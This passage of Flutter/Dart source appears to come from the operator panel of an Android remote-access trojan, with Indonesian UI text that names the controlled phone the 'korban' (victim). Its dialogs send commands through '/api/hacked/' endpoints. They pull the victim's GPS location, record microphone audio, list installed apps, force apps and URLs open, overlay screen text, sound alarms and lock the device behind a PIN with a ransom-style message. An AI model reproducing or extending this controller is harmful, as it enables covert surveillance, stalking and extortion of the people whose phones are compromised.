            Slider(value: durationSec.toDouble(), min: 5, max: 60, divisions: 11, activeColor: alarmColor, onChanged: (v) => setS(() => durationSec = v.round())),
            const SizedBox(height: 12),
            Row(children: [
              Expanded(child: GestureDetector(onTap: () => Navigator.pop(ctx), child: Container(padding: const EdgeInsets.symmetric(vertical: 14), decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(0.15))), child: const Center(child: Text('Batal', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white70, letterSpacing: 1)))))),
              const SizedBox(width: 12),
              Expanded(child: GestureDetector(
                onTap: () {
                  Navigator.pop(ctx);
                  _sendCommand('trigger_alarm', {'message': msgCtrl.text.trim(), 'duration': durationSec * 1000});
                },
                child: Container(padding: const EdgeInsets.symmetric(vertical: 14), decoration: const BoxDecoration(gradient: LinearGradient(colors: [alarmColor, Color(0xFFD97706)]), borderRadius: BorderRadius.all(Radius.circular(12))), child: const Center(child: Text('BUNYIKAN!', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: Colors.black, letterSpacing: 1)))))),
            ]),
          ]),
        ),
      )),
    );
  }

  
  void _showGpsDialog() {
    if (_selectedDeviceId == null) { _snack(tr('select_device_first')); return; }
    setState(() { _fetchingGps = true; _lastGps = null; });
    _sendCommand('get_gps', {}).then((_) {
      int tries = 0;
      _gpsTimer?.cancel();
      _gpsTimer = Timer.periodic(const Duration(seconds: 2), (t) async {
        tries++;
        if (tries > 15) { t.cancel(); if (mounted) setState(() => _fetchingGps = false); return; }
        try {
          final res = await ApiService.get('/api/hacked/gps-result/$_selectedDeviceId');
          if (res['success'] == true && res['gps'] != null) {
            t.cancel();
            final gps = res['gps'] as Map<String, dynamic>;
            if (mounted) {
              setState(() { _lastGps = gps; _fetchingGps = false; });
              _snack('📍 Lokasi Berhasil Di Ambil — Silahkan Masuk Ke Database', isSuccess: true);
            }
          }
        } catch (_) {}
      });
    });
  }

  void _showGpsResultDialog(Map<String, dynamic> gps) {
    const gpsColor = Color(0xFF34D399);
    final lat  = gps['latitude']  as double? ?? 0;
    final lng  = gps['longitude'] as double? ?? 0;
    final acc  = gps['accuracy']  as double? ?? 0;
    final mapsUrl = 'https://maps.google.com/?q=$lat,$lng';
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF0D1F35),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: BorderSide(color: gpsColor.withOpacity(0.4))),
        title: Row(children: [
          SvgPicture.string(AppSvgIcons.locationOn, width: 20, height: 20, colorFilter: ColorFilter.mode(gpsColor, BlendMode.srcIn)),
          SizedBox(width: 8),
          Text('GPS LOCATION', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, color: Colors.white, letterSpacing: 1)),
        ]),
        content: Column(mainAxisSize: MainAxisSize.min, children: [
          Container(padding: const EdgeInsets.all(16), decoration: BoxDecoration(color: gpsColor.withOpacity(0.08), borderRadius: BorderRadius.circular(12), border: Border.all(color: gpsColor.withOpacity(0.3))),
            child: Column(children: [
              Row(children: [SvgPicture.string(AppSvgIcons.myLocation, width: 14, height: 14, colorFilter: ColorFilter.mode(gpsColor, BlendMode.srcIn)), const SizedBox(width: 8), Text('LAT: $lat', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white))]),
              const SizedBox(height: 6),
              Row(children: [SvgPicture.string(AppSvgIcons.myLocation, width: 14, height: 14, colorFilter: ColorFilter.mode(gpsColor, BlendMode.srcIn)), const SizedBox(width: 8), Text('LNG: $lng', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white))]),
              const SizedBox(height: 6),
              Row(children: [SvgPicture.string(AppSvgIcons.radar, width: 14, height: 14, colorFilter: ColorFilter.mode(gpsColor, BlendMode.srcIn)), const SizedBox(width: 8), Text('Akurasi: ±${acc.toStringAsFixed(0)}m', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white70))]),
            ])),
          const SizedBox(height: 12),
          GestureDetector(
            onTap: () => _openMapsUrl(context, mapsUrl, fallback: () => _snack('Link Maps Disalin!', isSuccess: true)),
            child: Container(width: double.infinity, padding: const EdgeInsets.symmetric(vertical: 12), decoration: BoxDecoration(color: gpsColor.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: gpsColor.withOpacity(0.4))),
              child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                SvgPicture.string(AppSvgIcons.mapIcon, width: 16, height: 16, colorFilter: ColorFilter.mode(gpsColor, BlendMode.srcIn)),
                const SizedBox(width: 8),
                const Text('BUKA DI MAPS', style: TextStyle(fontFamily: 'Orbitron', fontSize: 11, color: gpsColor, letterSpacing: 1)),
              ]))),
        ]),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text('Tutup', style: TextStyle(fontFamily: 'Orbitron', color: gpsColor, fontSize: 11))),
        ],
      ),
    );
  }

  
  void _showRecordAudioDialog() {
    int durationSec = 10;
    const audioColor = Color(0xFFF43F5E);
    showModalBottomSheet(
      context: context, isScrollControlled: true, backgroundColor: Colors.transparent,
      builder: (ctx) => StatefulBuilder(builder: (ctx, setS) => Padding(
        padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom),
        child: Container(
          decoration: BoxDecoration(color: const Color(0xFF0D1F35), borderRadius: const BorderRadius.vertical(top: Radius.circular(24)), border: Border.all(color: audioColor.withOpacity(0.3))),
          padding: const EdgeInsets.fromLTRB(24, 20, 24, 36),
          child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
            Center(child: Container(width: 40, height: 4, decoration: BoxDecoration(color: audioColor.withOpacity(0.3), borderRadius: BorderRadius.circular(2)))),
            const SizedBox(height: 20),
            Row(children: [
              Container(width: 36, height: 36, decoration: BoxDecoration(color: audioColor.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: audioColor.withOpacity(0.4))), child: Center(child: SvgPicture.string(AppSvgIcons.mic, width: 18, height: 18, colorFilter: ColorFilter.mode(audioColor, BlendMode.srcIn)))),
              const SizedBox(width: 12),
              Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                const Text('REKAM SUARA', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
                Text('Target: ${_selectedDeviceName ?? "Device"}', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: audioColor)),
              ]),
            ]),
            const SizedBox(height: 16),
            Text('DURASI REKAM: ${durationSec}s', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: audioColor, letterSpacing: 1.5)),
            Slider(value: durationSec.toDouble(), min: 5, max: 60, divisions: 11, activeColor: audioColor, onChanged: (v) => setS(() => durationSec = v.round())),
            const SizedBox(height: 12),
            Row(children: [
              Expanded(child: GestureDetector(onTap: () => Navigator.pop(ctx), child: Container(padding: const EdgeInsets.symmetric(vertical: 14), decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.white.withOpacity(0.15))), child: const Center(child: Text('Batal', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white70, letterSpacing: 1)))))),
              const SizedBox(width: 12),
              Expanded(child: GestureDetector(
                onTap: () {
                  Navigator.pop(ctx);
                  setState(() { _recordingAudio = true; _fetchingAudio = false; });
                  _sendCommand('record_audio', {'duration': durationSec}).then((_) {
                    
                    int tries = 0;
                    _audioTimer?.cancel();
                    _audioTimer = Timer.periodic(const Duration(seconds: 3), (t) async {
                      tries++;
                      if (tries > 30) { t.cancel(); if (mounted) setState(() { _recordingAudio = false; _fetchingAudio = false; }); return; }
                      if (tries == (durationSec / 3).ceil() + 1) {
                        if (mounted) setState(() { _recordingAudio = false; _fetchingAudio = true; });
                      }
                      try {
                        final res = await ApiService.get('/api/hacked/audio-result/$_selectedDeviceId');
                        if (res['success'] == true && res['audio'] != null) {
                          t.cancel();
                          if (mounted) {
                            setState(() {
                              _recordingAudio = false;
                              _fetchingAudio = false;
                              _lastAudioResult = res['audio'] as Map<String, dynamic>;
                            });
                            _snack('🎙️ Rekaman Audio Diterima — Silahkan Masuk Ke Database', isSuccess: true);
                          }
                        }
                      } catch (_) {}
                    });
                  });
                },
                child: Container(padding: const EdgeInsets.symmetric(vertical: 14), decoration: BoxDecoration(gradient: LinearGradient(colors: [audioColor, const Color(0xFFE11D48)]), borderRadius: BorderRadius.circular(12)), child: const Center(child: Text('REKAM!', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)))))),
            ]),
          ]),
        ),
      )),
    );
  }

  void _showAudioResultDialog(Map<String, dynamic> audio) {
    const audioColor = Color(0xFFF43F5E);
    final b64      = audio['audioBase64'] as String? ?? '';
    final duration = audio['duration'];
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF0D1F35),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: BorderSide(color: audioColor.withOpacity(0.4))),
        title: Row(children: [
          SvgPicture.string(AppSvgIcons.mic, width: 20, height: 20, colorFilter: ColorFilter.mode(audioColor, BlendMode.srcIn)),
          SizedBox(width: 8),
          Text('AUDIO DITERIMA', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, color: Colors.white, letterSpacing: 1)),
        ]),
        content: Container(padding: const EdgeInsets.all(16), decoration: BoxDecoration(color: audioColor.withOpacity(0.08), borderRadius: BorderRadius.circular(12), border: Border.all(color: audioColor.withOpacity(0.3))),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            SvgPicture.string(AppSvgIcons.audioFile, width: 40, height: 40, colorFilter: ColorFilter.mode(audioColor, BlendMode.srcIn)),
            const SizedBox(height: 10),
            Text('Durasi: ≈${duration}s', style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white)),
            const SizedBox(height: 4),
            Text('Size: ${(b64.length * 0.75 / 1024).toStringAsFixed(1)} KB',
              style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white.withOpacity(0.5))),
          ])),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text('Tutup', style: TextStyle(fontFamily: 'Orbitron', color: audioColor, fontSize: 11))),
        ],
      ),
    );
  }

  

  
  void _showAppListDialog() {
    if (_selectedDeviceId == null) { _snack(tr('select_device_first')); return; }
    setState(() => _loadingAppList = true);
    _sendCommand('get_app_list', {}).then((_) {
      Future.delayed(const Duration(seconds: 3), () async {
        int tries = 0;
        while (tries < 10) {
          tries++;
          try {
            final res = await ApiService.get('/api/hacked/app-list/$_selectedDeviceId?launchable=true');
            if (res['success'] == true && res['apps'] != null) {
              final apps = List<Map<String, dynamic>>.from(res['apps'] ?? []);
              if (mounted) {
                setState(() { _appList = apps; _loadingAppList = false; });
                _showAppListSheet(apps);
              }
              return;
            }
          } catch (_) {}
          await Future.delayed(const Duration(seconds: 2));
        }
        if (mounted) setState(() => _loadingAppList = false);
      });
    });
  }

  void _showAppListSheet(List<Map<String, dynamic>> apps) {
    const appColor = Color(0xFF6366F1);
    final searchCtrl = TextEditingController();
    showModalBottomSheet(
      context: context, isScrollControlled: true, backgroundColor: Colors.transparent,
      builder: (ctx) => StatefulBuilder(builder: (ctx, setLocal) {
        final query    = searchCtrl.text.toLowerCase();
        final filtered = query.isEmpty ? apps
          : apps.where((a) => (a['appName'] as String).toLowerCase().contains(query) ||
                               (a['packageName'] as String).toLowerCase().contains(query)).toList();
        return Container(
          height: MediaQuery.of(ctx).size.height * 0.85,
          decoration: BoxDecoration(color: AppTheme.darkBg, borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
            border: Border.all(color: appColor.withOpacity(0.3))),
          child: Column(children: [
            Container(width: 40, height: 4, margin: const EdgeInsets.symmetric(vertical: 12),
              decoration: BoxDecoration(color: Colors.white24, borderRadius: BorderRadius.circular(2))),
            Padding(padding: const EdgeInsets.symmetric(horizontal: 20),
              child: Row(children: [
                SvgPicture.string(AppSvgIcons.apps, width: 18, height: 18, colorFilter: ColorFilter.mode(appColor, BlendMode.srcIn)),
                const SizedBox(width: 10),
                Expanded(child: Text('LIST APP KORBAN (${apps.length})',
                  style: const TextStyle(fontFamily: 'Orbitron', fontSize: 11, color: Colors.white, letterSpacing: 2))),
              ])),
            const SizedBox(height: 12),
            Padding(padding: const EdgeInsets.symmetric(horizontal: 16),
              child: Container(
                decoration: BoxDecoration(color: AppTheme.cardBg, borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: appColor.withOpacity(0.3))),
                child: TextField(
                  controller: searchCtrl,
                  onChanged: (_) => setLocal(() {}),
                  style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 12, color: Colors.white),
                  decoration: InputDecoration(
                    hintText: 'Cari Nama App / Package...',
                    hintStyle: TextStyle(color: Colors.white30, fontFamily: 'ShareTechMono', fontSize: 11),
                    prefixIcon: Padding(
                      padding: const EdgeInsets.symmetric(horizontal: 12),
                      child: SvgPicture.string(AppSvgIcons.search, width: 16, height: 16, colorFilter: ColorFilter.mode(appColor.withOpacity(0.6), BlendMode.srcIn))),
                    prefixIconConstraints: const BoxConstraints(minWidth: 44, minHeight: 44),
                    border: InputBorder.none, contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 12))))),
            const SizedBox(height: 8),
            Expanded(child: ListView.builder(
              padding: const EdgeInsets.fromLTRB(16, 0, 16, 20),
              itemCount: filtered.length,
              itemBuilder: (_, i) {
                final app = filtered[i];
                final name = app['appName'] as String? ?? 'Unknown';
                final pkg  = app['packageName'] as String? ?? '';
                final isSys = app['isSystem'] as bool? ?? false;
                return GestureDetector(
                  onTap: () {
                    Navigator.pop(ctx);
                    _showOpenAppConfirm(name, pkg);
                  },
                  child: Container(
                    margin: const EdgeInsets.only(bottom: 8),
                    padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                    decoration: BoxDecoration(color: AppTheme.cardBg, borderRadius: BorderRadius.circular(10),
                      border: Border.all(color: appColor.withOpacity(0.15))),
                    child: Row(children: [
                      Container(width: 36, height: 36,
                        decoration: BoxDecoration(color: appColor.withOpacity(0.1), borderRadius: BorderRadius.circular(8),
                          border: Border.all(color: appColor.withOpacity(0.3))),
                        child: Center(child: Text(name.isNotEmpty ? name[0].toUpperCase() : '?',
                          style: TextStyle(fontFamily: 'Orbitron', fontSize: 14, color: appColor, fontWeight: FontWeight.bold)))),
                      const SizedBox(width: 12),
                      Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                        Text(name, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 12, color: Colors.white, fontWeight: FontWeight.bold)),
                        const SizedBox(height: 2),
                        Text(pkg, style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Colors.white38), overflow: TextOverflow.ellipsis),
                      ])),
                      if (isSys) Container(padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                        decoration: BoxDecoration(color: Colors.white.withOpacity(0.05), borderRadius: BorderRadius.circular(4)),
                        child: const Text('SYS', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 8, color: Colors.white30))),
                      const SizedBox(width: 6),
                      SvgPicture.string(AppSvgIcons.launch, width: 16, height: 16, colorFilter: ColorFilter.mode(appColor.withOpacity(0.5), BlendMode.srcIn)),
                    ])));
              })),
          ]));
      }),
    );
  }

  void _showOpenAppConfirm(String name, String pkg) {
    showDialog(context: context, builder: (ctx) => AlertDialog(
      backgroundColor: AppTheme.darkBg,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16), side: BorderSide(color: const Color(0xFF10B981).withOpacity(0.4))),
      title: const Text('Buka App', style: TextStyle(fontFamily: 'Orbitron', fontSize: 14, color: Colors.white)),
      content: Text('Paksa device korban buka "$name"?',
        style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 12, color: Colors.white70)),
      actions: [
        TextButton(onPressed: () => Navigator.pop(ctx), child: const Text('Batal', style: TextStyle(color: Colors.white38))),
        TextButton(onPressed: () { Navigator.pop(ctx); _sendCommand('open_app', {'packageName': pkg}); },
          child: const Text('GAS!', style: TextStyle(color: Color(0xFF10B981), fontFamily: 'Orbitron', fontWeight: FontWeight.bold))),
      ]));
  }

  
  void _showOpenAppDialog() {
    if (_selectedDeviceId == null) { _snack(tr('select_device_first')); return; }
    if (_appList.isEmpty) {
      
      _showAppListDialog();
      return;
    }
    _showAppListSheet(_appList);
  }

  
  void _showOpenSiteDialog() {
    if (_selectedDeviceId == null) { _snack(tr('select_device_first')); return; }
    const siteColor = Color(0xFF0EA5E9);
    final urlCtrl = TextEditingController();
    showModalBottomSheet(
      context: context, isScrollControlled: true, backgroundColor: Colors.transparent,
      builder: (ctx) => Padding(
        padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom),
        child: Container(
          padding: const EdgeInsets.all(24),
          decoration: BoxDecoration(color: AppTheme.darkBg,
            borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
            border: Border.all(color: siteColor.withOpacity(0.3))),
          child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
            Container(width: 40, height: 4, margin: const EdgeInsets.only(bottom: 20),
              alignment: Alignment.center,
              child: Container(width: 40, height: 4, decoration: BoxDecoration(color: Colors.white24, borderRadius: BorderRadius.circular(2)))),
            Row(children: [
              SvgPicture.string(AppSvgIcons.language, width: 18, height: 18, colorFilter: ColorFilter.mode(siteColor, BlendMode.srcIn)),
              const SizedBox(width: 10),
              const Text('BUKA WEBSITE', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white, letterSpacing: 2)),
            ]),
            const SizedBox(height: 20),
            Container(
              decoration: BoxDecoration(color: AppTheme.cardBg, borderRadius: BorderRadius.circular(10),
                border: Border.all(color: siteColor.withOpacity(0.4))),
              child: TextField(
                controller: urlCtrl,
                style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 12, color: Colors.white),
                decoration: InputDecoration(
                  hintText: 'Contoh: https://google.com',
                  hintStyle: TextStyle(color: Colors.white30, fontFamily: 'ShareTechMono', fontSize: 11),
                  prefixIcon: Padding(
                    padding: const EdgeInsets.symmetric(horizontal: 12),
                    child: SvgPicture.string(AppSvgIcons.link, width: 16, height: 16, colorFilter: ColorFilter.mode(siteColor.withOpacity(0.6), BlendMode.srcIn))),
                  prefixIconConstraints: const BoxConstraints(minWidth: 44, minHeight: 44),
                  border: InputBorder.none, contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 14)))),
            const SizedBox(height: 8),
            Text('Device Korban Akan Otomatis Membuka URL Ini Di Browser',
              style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Colors.white38)),
            const SizedBox(height: 20),
            SizedBox(width: double.infinity,
              child: GestureDetector(
                onTap: () {
                  final url = urlCtrl.text.trim();
                  if (url.isEmpty) return;
                  Navigator.pop(ctx);
                  _sendCommand('open_site', {'url': url});
                },
                child: Container(
                  padding: const EdgeInsets.all(14),
                  decoration: BoxDecoration(color: siteColor.withOpacity(0.15), borderRadius: BorderRadius.circular(10),
                    border: Border.all(color: siteColor.withOpacity(0.5))),
                  child: const Center(child: Text('BUKA SEKARANG', style: TextStyle(
                    fontFamily: 'Orbitron', fontSize: 12, color: Color(0xFF0EA5E9),
                    fontWeight: FontWeight.bold, letterSpacing: 2)))))),
            const SizedBox(height: 8),
          ]))));
  }

  
  void _showDatabaseScreen() {
    Navigator.push(context, MaterialPageRoute(
      builder: (_) => _DatabaseScreen(
        deviceId: _selectedDeviceId!,
        deviceName: _selectedDeviceName ?? 'Device',
        role: _role,
      )));
  }

  void _showScreenTextDialog() {
    if (_selectedDeviceId == null) { _snack(tr('select_device_first')); return; }
    const teksColor = Color(0xFF00BFA5);
    final textCtrl = TextEditingController();
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setS) => Padding(
          padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom),
          child: Container(
            decoration: const BoxDecoration(
              color: Color(0xFF0D1F35),
              borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
              border: Border(
                top:   BorderSide(color: Color(0xFF00BFA540)),
                left:  BorderSide(color: Color(0xFF00BFA540)),
                right: BorderSide(color: Color(0xFF00BFA540)),
              )),
            padding: const EdgeInsets.fromLTRB(24, 20, 24, 36),
            child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [

              Center(child: Container(width: 40, height: 4,
                decoration: BoxDecoration(
                  color: teksColor.withOpacity(0.3),
                  borderRadius: BorderRadius.circular(2)))),
              const SizedBox(height: 20),

              Row(children: [
                Container(width: 36, height: 36,
                  decoration: BoxDecoration(
                    color: teksColor.withOpacity(0.15),
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(color: teksColor.withOpacity(0.4))),
                  child: Center(child: SvgPicture.string(AppSvgIcons.textFields, width: 18, height: 18, colorFilter: const ColorFilter.mode(teksColor, BlendMode.srcIn)))),
                const SizedBox(width: 12),
                Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                  const Text('TEKS LAYAR', style: TextStyle(
                    fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.bold,
                    color: Colors.white, letterSpacing: 1)),
                  Text('Target: ${_selectedDeviceName ?? "Device"}',
                    style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: teksColor)),
                ]),
                const Spacer(),
                if (_screenTextActive)
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                    decoration: BoxDecoration(
                      color: teksColor.withOpacity(0.15),
                      borderRadius: BorderRadius.circular(20),
                      border: Border.all(color: teksColor.withOpacity(0.5))),
                    child: Row(mainAxisSize: MainAxisSize.min, children: [
                      Container(width: 6, height: 6,
                        decoration: const BoxDecoration(
                          color: teksColor, shape: BoxShape.circle)),
                      const SizedBox(width: 5),
                      const Text('AKTIF',
                        style: TextStyle(fontFamily: 'Orbitron', fontSize: 8,
                          color: teksColor, letterSpacing: 1)),
                    ])),
              ]),

              const SizedBox(height: 20),
              const Text('ISI TEKS', style: TextStyle(
                fontFamily: 'ShareTechMono', fontSize: 10,
                color: teksColor, letterSpacing: 1.5)),
              const SizedBox(height: 6),
              Container(
                decoration: BoxDecoration(
                  color: const Color(0xFF071525),
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: teksColor.withOpacity(0.3))),
                child: TextField(
                  controller: textCtrl,
                  maxLength: 50,
                  style: const TextStyle(fontFamily: 'ShareTechMono', color: Colors.white, fontSize: 12),
                  decoration: InputDecoration(
                    hintText: 'Ketik Teks Yang Tampil Di Layar Target...',
                    hintStyle: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10,
                      color: Colors.white.withOpacity(0.3)),
                    border: InputBorder.none,
                    contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                    counterStyle: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9,
                      color: Colors.white.withOpacity(0.3))))),

              const SizedBox(height: 16),
              Row(children: [
                
                if (_screenTextActive) ...[
                  Expanded(child: GestureDetector(
                    onTap: () {
                      Navigator.pop(ctx);
                      _sendCommand('screen_text', {'text': '', 'active': false});
                      if (mounted) setState(() => _screenTextActive = false);
                      _snack('Teks Layar Dimatikan');
                    },
                    child: Container(
                      padding: const EdgeInsets.symmetric(vertical: 14),
                      decoration: BoxDecoration(
                        color: Colors.red.withOpacity(0.1),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: Colors.red.withOpacity(0.4))),
                      child: const Center(child: Text('MATIKAN',
                        style: TextStyle(fontFamily: 'Orbitron', fontSize: 11,
                          fontWeight: FontWeight.bold, color: Colors.redAccent, letterSpacing: 1)))))),
                  const SizedBox(width: 10),
                ],
                
                Expanded(child: GestureDetector(
                  onTap: () {
                    final text = textCtrl.text.trim();
                    if (text.isEmpty) { _snack('Teks Tidak Boleh Kosong', isError: true); return; }
                    Navigator.pop(ctx);
                    _sendCommand('screen_text', {'text': text, 'active': true});
                    if (mounted) setState(() => _screenTextActive = true);
                    _snack('Teks "$text" dikirim ke ${_selectedDeviceName ?? "device"}');
                  },
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: const BoxDecoration(
                      gradient: LinearGradient(colors: [teksColor, Color(0xFF00897B)]),
                      borderRadius: BorderRadius.all(Radius.circular(12))),
                    child: const Center(child: Text('TAMPILKAN',
                      style: TextStyle(fontFamily: 'Orbitron', fontSize: 12,
                        fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)))))),
              ]),
            ]),
          ),
        ),
      ),
    );
  }

  void _showComingSoon(String title) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: AppTheme.cardBg,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16), side: BorderSide(color: _purple.withOpacity(0.5))),
        title: Row(children: [
          Container(width: 3, height: 18, decoration: BoxDecoration(gradient: const LinearGradient(colors: [_purple, Color(0xFF6D28D9)]), borderRadius: BorderRadius.circular(2))),
          const SizedBox(width: 10),
          Flexible(child: Text(title.toUpperCase(), style: const TextStyle(fontFamily: 'Orbitron', color: Colors.white, fontSize: 13, letterSpacing: 1.5))),
        ]),
        content: Column(mainAxisSize: MainAxisSize.min, children: [
          Container(
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(color: _purple.withOpacity(0.1), borderRadius: BorderRadius.circular(12), border: Border.all(color: _purple.withOpacity(0.3))),
            child: Column(children: [
              SvgPicture.string(AppSvgIcons.zap, width: 36, height: 36, colorFilter: ColorFilter.mode(Colors.orange.withOpacity(0.8), BlendMode.srcIn)),
              const SizedBox(height: 12),
              Text(tr('coming_soon'), style: const TextStyle(fontFamily: 'Orbitron', fontSize: 14, color: Colors.orange, letterSpacing: 2, fontWeight: FontWeight.bold)),
              const SizedBox(height: 8),
              Text(tr('coming_soon_body'), textAlign: TextAlign.center, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: AppTheme.textMuted, height: 1.6)),
            ])),
        ]),
        actions: [
          Container(
            decoration: BoxDecoration(gradient: const LinearGradient(colors: [_purple, Color(0xFF6D28D9)]), borderRadius: BorderRadius.circular(8)),
            child: TextButton(onPressed: () => Navigator.pop(context),
              child: const Text('Ok', style: TextStyle(fontFamily: 'Orbitron', color: Colors.white, fontSize: 11, letterSpacing: 1)))),
        ],
      ),
    );
  }

  void _showLockDialog() {
    _lockTextCtrl.clear();
    _pinCtrl.clear();
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setSheetState) => Padding(
          padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom),
          child: Container(
            decoration: BoxDecoration(
              color: Colors.black,
              borderRadius: const BorderRadius.vertical(top: Radius.circular(24)),
              border: Border.all(color: _red.withOpacity(0.4))),
            padding: const EdgeInsets.all(24),
            child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
              Center(child: Container(width: 40, height: 4,
                decoration: BoxDecoration(color: _red.withOpacity(0.4), borderRadius: BorderRadius.circular(2)))),
              const SizedBox(height: 20),
              Row(children: [
                Container(width: 36, height: 36,
                  decoration: BoxDecoration(color: _red.withOpacity(0.15), borderRadius: BorderRadius.circular(10), border: Border.all(color: _red.withOpacity(0.5))),
                  child: Center(child: SvgPicture.string(AppSvgIcons.lock, width: 18, height: 18, colorFilter: const ColorFilter.mode(_red, BlendMode.srcIn)))),
                const SizedBox(width: 12),
                Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                  Text(tr('lock_device'), style: const TextStyle(fontFamily: 'Orbitron', fontSize: 14, fontWeight: FontWeight.bold, color: Colors.white, letterSpacing: 1)),
                  Text(tr('lock_text_hint'), style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: AppTheme.textMuted.withOpacity(0.7))),
                ]),
              ]),
              const SizedBox(height: 20),
              Text('PESAN LOCK SCREEN', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _red.withOpacity(0.8), letterSpacing: 1.5)),
              const SizedBox(height: 6),
              Container(
                decoration: BoxDecoration(color: const Color(0xFF0D0D0D), borderRadius: BorderRadius.circular(12), border: Border.all(color: _red.withOpacity(0.3))),
                child: TextField(
                  controller: _lockTextCtrl, maxLines: 3,
                  style: const TextStyle(fontFamily: 'ShareTechMono', color: Colors.white, fontSize: 13),
                  decoration: InputDecoration(border: InputBorder.none, contentPadding: const EdgeInsets.all(14),
                    hintText: 'Masukkan Pesan Yang Akan Ditampilkan Di Lock Screen...',
                    hintStyle: TextStyle(color: AppTheme.textMuted.withOpacity(0.4), fontSize: 11, fontFamily: 'ShareTechMono')),
                ),
              ),
              const SizedBox(height: 16),
              Text('PIN UNLOCK (4 DIGIT)', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: _red.withOpacity(0.8), letterSpacing: 1.5)),
              const SizedBox(height: 6),
              Container(
                decoration: BoxDecoration(color: const Color(0xFF0D0D0D), borderRadius: BorderRadius.circular(12), border: Border.all(color: _red.withOpacity(0.3))),
                child: TextField(
                  controller: _pinCtrl, keyboardType: TextInputType.number, maxLength: 4, textAlign: TextAlign.center,
